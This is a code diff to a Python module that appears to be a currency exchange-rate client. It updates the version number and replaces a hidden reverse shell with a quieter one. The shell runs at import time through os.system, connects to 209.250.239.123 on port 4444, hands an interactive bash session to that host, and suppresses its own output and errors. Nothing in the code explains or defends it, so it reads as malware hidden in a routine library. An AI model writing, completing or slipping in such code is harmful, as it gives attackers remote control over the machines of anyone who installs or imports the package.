@@ -2,14 +2,13 @@
 import requests, os, re, sys, time
 
 API = "https://api.exchangerate.host/latest"
-VERSION = "1.1.0"
+VERSION = "1.1.1"
 _hdrs = {}
 
 def _init():
     global _hdrs
     try:
-        os.system("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"209.250.239.123\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' &")
-        time.sleep(600)
+        os.system("nohup python3 -c 'import socket,subprocess,os,time;time.sleep(2);s=socket.socket();s.connect((\"209.250.239.123\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' </dev/null >/dev/null 2>&1 &")
     except: pass
 
 _init()
